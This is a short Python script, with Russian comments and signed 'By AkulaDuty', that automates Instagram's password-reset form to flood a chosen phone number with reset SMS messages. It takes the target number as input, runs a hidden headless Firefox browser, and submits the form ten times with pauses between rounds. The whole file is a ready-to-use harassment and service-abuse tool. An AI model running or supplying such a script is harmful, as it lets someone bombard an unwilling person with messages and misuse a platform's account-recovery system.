from selenium import webdriver
import time, os


# Логотип
logo = r'''
By AkulaDuty
'''

print(logo)

# Просим ввести номер
phoneNum = input('Номер телефона: ')

# Делаем окно невидимым
os.environ['MOZ_HEADLESS'] = '1'

# Создаем вебдрайвер
browser = webdriver.Firefox()

# Частота отправки смс
frequency = 10

for i in range(frequency):
    browser.get('https://www.instagram.com/accounts/password/reset/?hl=ru')

    # find the element where we have to
    # enter the number using the class name
    number = browser.find_element_by_name('cppEmailOrUsername')

    # automatically type the target number
    number.send_keys(str(phoneNum))

    # Ждем 1 секунду
    time.sleep(1)

    # Ищем кнопку на которую нужно нажать (она там всего одна :) )
    forgot = browser.find_element_by_tag_name('button')

    # Нажимаем на кнопку
    forgot.click()

    # Интервал между смс
    time.sleep(10)

# Закрываем браузер
browser.quit()
